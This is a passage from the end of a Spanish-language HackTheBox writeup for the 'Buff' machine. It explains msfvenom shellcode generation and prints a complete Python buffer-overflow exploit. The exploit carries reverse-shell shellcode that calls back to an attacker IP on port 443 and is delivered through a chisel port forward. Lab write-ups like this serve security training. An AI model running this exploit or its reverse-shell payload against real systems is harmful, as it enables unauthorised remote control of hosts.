conexión</table></div><p>msfvenom por defecto nos agregará el encoder <strong>shikata_ga_nai</strong> y debido a que le agregamos los parámetros <code class="language-plaintext highlighter-rouge">-f</code> y <code class="language-plaintext highlighter-rouge">-v</code>, nos ha agregado todo el shellcode de una manera cómoda a la variable definida.</p><p><img data-src="/images/HTB/Buff/86-shellcode-generation-local.png" alt="" data-proofer-ignore></p><blockquote><p>Considerar que para que el shellcode se decodifique e interprete correctamente, deberemos agregar un “colchón” de nops (\x90) justo antes.</p></blockquote><hr /><h3 id="exploit"><span class="mr-2">Exploit</span><a href="#exploit" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>Agregamos todo lo anterior al script y primero, antes de ejecutarlo contra <strong>Buff</strong>, lo ejecutaré localmentre contra la VM.</p><p><img data-src="/images/HTB/Buff/87-bof-exploit-local.png" alt="" data-proofer-ignore></p><p><strong>¡Y Funciona correctamente!</strong></p><p>Para la explotación contra la máquina de <strong>HTB</strong> deberemos generar nuevamente el shellcode indicando la IP de la VPN como <code class="language-plaintext highlighter-rouge">LHOST</code>. El script final quedaría de la siguiente forma.</p><div file="bof.py" class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="bof.py"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">host</span> <span class="o">=</span> <span class="s">"127.0.0.1"</span>
<span class="n">port</span> <span class="o">=</span> <span class="mi">8888</span>
<span class="n">offset</span> <span class="o">=</span> <span class="mi">1052</span>
<span class="n">junk</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="n">offset</span>

<span class="c1"># msfvenom -p windows/shell_reverse_tcp -a x86 LHOST=10.10.14.116 LPORT=443 EXITFUNC=thread -b '\x00' -f python -v shellcode
</span><span class="n">shellcode</span> <span class="o">=</span>  <span class="sa">b</span><span class="s">""</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xdd\xc2\xd9\x74\x24\xf4\xb8\xf7\xb9\x52\xb0</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x5a\x29\xc9\xb1\x52\x83\xc2\x04\x31\x42\x13</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x03\xb5\xaa\xb0\x45\xc5\x25\xb6\xa6\x35\xb6</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xd7\x2f\xd0\x87\xd7\x54\x91\xb8\xe7\x1f\xf7</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x34\x83\x72\xe3\xcf\xe1\x5a\x04\x67\x4f\xbd</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x2b\x78\xfc\xfd\x2a\xfa\xff\xd1\x8c\xc3\xcf</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x27\xcd\x04\x2d\xc5\x9f\xdd\x39\x78\x0f\x69</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x77\x41\xa4\x21\x99\xc1\x59\xf1\x98\xe0\xcc</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x89\xc2\x22\xef\x5e\x7f\x6b\xf7\x83\xba\x25</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x8c\x70\x30\xb4\x44\x49\xb9\x1b\xa9\x65\x48</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x65\xee\x42\xb3\x10\x06\xb1\x4e\x23\xdd\xcb</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x94\xa6\xc5\x6c\x5e\x10\x21\x8c\xb3\xc7\xa2</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x82\x78\x83\xec\x86\x7f\x40\x87\xb3\xf4\x67</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x47\x32\x4e\x4c\x43\x1e\x14\xed\xd2\xfa\xfb</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x12\x04\xa5\xa4\xb6\x4f\x48\xb0\xca\x12\x05</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x75\xe7\xac\xd5\x11\x70\xdf\xe7\xbe\x2a\x77</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x44\x36\xf5\x80\xab\x6d\x41\x1e\x52\x8e\xb2</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x37\x91\xda\xe2\x2f\x30\x63\x69\xaf\xbd\xb6</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x3e\xff\x11\x69\xff\xaf\xd1\xd9\x97\xa5\xdd</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x06\x87\xc6\x37\x2f\x22\x3d\xd0\x5a\xb9\x33</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x54\x33\xbf\x4b\x95\x78\x36\xad\xff\x6e\x1f</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x66\x68\x16\x3a\xfc\x09\xd7\x90\x79\x09\x53</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x17\x7e\xc4\x94\x52\x6c\xb1\x54\x29\xce\x14</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x6a\x87\x66\xfa\xf9\x4c\x76\x75\xe2\xda\x21</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xd2\xd4\x12\xa7\xce\x4f\x8d\xd5\x12\x09\xf6</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x5d\xc9\xea\xf9\x5c\x9c\x57\xde\x4e\x58\x57</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x5a\x3a\x34\x0e\x34\x94\xf2\xf8\xf6\x4e\xad</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x57\x51\x06\x28\x94\x62\x50\x35\xf1\x14\xbc</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x84\xac\x60\xc3\x29\x39\x65\xbc\x57\xd9\x8a</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x17\xdc\xf9\x68\xbd\x29\x92\x34\x54\x90\xff</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xc6\x83\xd7\xf9\x44\x21\xa8\xfd\x55\x40\xad</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xba\xd1\xb9\xdf\xd3\xb7\xbd\x4c\xd3\x9d</span><span class="s">"</span>

<span class="c1"># jmp_esp: 69A5F0EF
</span><span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span><span class="n">junk</span><span class="p">,</span> <span class="mh">0x69A5F0EF</span><span class="p">,</span> <span class="n">asm</span><span class="p">(</span><span class="s">'nop'</span><span class="p">)</span><span class="o">*</span><span class="mi">20</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">)</span>

<span class="k">try</span><span class="p">:</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"[+] Enviando {} bytes!"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)))</span>
    <span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
</pre></table></code></div></div><p>Hacemos un remote port forwarding con la consola de bajo nivel obtenida anteriormente.</p><ol><li>Desde la máquina local ejecutamos chisel como server y en modo reverse.<li>Desde la Máquina Buff nos conectamos como cliente y realizamos un remote port forwarding del puerto 8888.</ol><p><img data-src="/images/HTB/Buff/89-chisel-tunnel-v2.png" alt="" data-proofer-ignore></p><p>Y finalmente lanzamos nuestro exploit.</p><p><img data-src="/images/HTB/Buff/90-rooted.png" alt="" data-proofer-ignore></p><p>Ya a partir de aquí la máquina estaría rooteada y encontrar e ingresar las flag no tiene ciencia alguna.</p><p><img data-src="/images/HTB/Buff/100-pwned.png" alt="" data-proofer-ignore></p><blockquote><p>¡Happy Hacking and keep grinding!</p></blockquote><hr /><h1 id="recursos">Recursos</h1><ul><li>Resolución de Buff (s4vitar): <a href="https://youtu.be/TytUFooC3kU">https://youtu.be/TytUFooC3kU</a><li>Buffer Overflow prep (Tryhackme): <a href="https://tryhackme.com/room/bufferoverflowprep">https://tryhackme.com/room/bufferoverflowprep</a><li>Buffer Overflow basics (TCM): <a href="https://youtu.be/qSnPayW6F7U">https://youtu.be/qSnPayW6F7U</a><li><a href="https://infosecwriteups.com/stack-based-buffer-overflow-practical-for-windows-vulnserver-8d2be7321af5">https://infosecwriteups.com/stack-based-buffer-overflow-practical-for-windows-vulnserver-8d2be7321af5</a><li><a href="https://github.com/joshua17sc/Buffer-Overflows">https://github.com/joshua17sc/Buffer-Overflows</a></ul></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/htb/'>HTB</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/easy/" class="post-tag no-text-decoration" >easy</a> <a href="/tags/windows/" class="post-tag no-text-decoration" >windows</a> <a href="/tags/buffer-overflow/" class="post-tag no-text-decoration" >buffer-overflow</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Buff Writeup [ES] - HackTheBox - brsalcedom&amp;url=https://brsalcedom.github.io/Buff-Writeup-HackTheBox/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Buff Writeup [ES] - HackTheBox - brsalcedom&amp;u=https://brsalcedom.github.io/Buff-Writeup-HackTheBox/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://brsalcedom.github.io/Buff-Writeup-HackTheBox/&amp;text=Buff Writeup [ES] - HackTheBox - brsalcedom" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/easy/">easy</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/medium/">medium</a> <a class="post-tag" href="/tags/active-directory/">active-directory</a> <a class="post-tag" href="/tags/privesc/">privesc</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/jenkins/">jenkins</a> <a class="post-tag" href="/tags/kerberoasting/">kerberoasting</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/Heist-Writeup-HackTheBox/"><div class="card-body"> <em class="timeago small" data-ts="1638201600" > 2021-11-29 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Heist Writeup [ES] - HackTheBox</h3><div class="text-muted small"><p> Heist es una máquina Linux de dificultad fácil ofrecida por la plataforma de Hack The Box. A lo largo de este post encontrarás un writeup de su resolución. Información Enumeración Rustscan - N...</p></div></div></a></div><div class="card"> <a href="/Active-Writeup-HackTheBox/"><div class="card-body"> <em class="timeago small" data-ts="1642640400" > 2022-01-19 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Active Writeup [ES] - HackTheBox</h3><div class="text-muted small"><p> Active es una máquina Windows de dificultad fácil ofrecida por la plataforma de Hack The Box. A lo largo de este post encontrarás un paso a paso de su resolución. Resumen Esta máquina trata conce...</p></div></div></a></div><div class="card"> <a href="/Sauna-Writeup-HackTheBox/"><div class="card-body"> <em class="timeago small" data-ts="1644076800" > 2022-02-05 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Sauna Writeup [ES] - HackTheBox</h3><div class="text-muted small"><p> Resumen Sauna es una máquina Windows de dificultad fácil de la plataforma de Hack The Box, incluye conceptos de explotación de Active Directory y enumeración básica. Comenzaremos por encontrar us...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/Object-Writeup-HackTheBox/" class="btn btn-outline-primary" prompt="Older"><p>Object Writeup [ES] - HackTheBox</p></a> <a href="/Bounty-Writeup-HackTheBox/" class="btn btn-outline-primary" prompt="Newer"><p>Bounty Writeup [ES] - HackTheBox</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/Cervant_0">Bryan Salcedo</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/easy/">easy</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/medium/">medium</a> <a class="post-tag" href="/tags/active-directory/">active-directory</a> <a class="post-tag" href="/tags/privesc/">privesc</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/jenkins/">jenkins</a> <a class="post-tag" href="/tags/kerberoasting/">kerberoasting</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
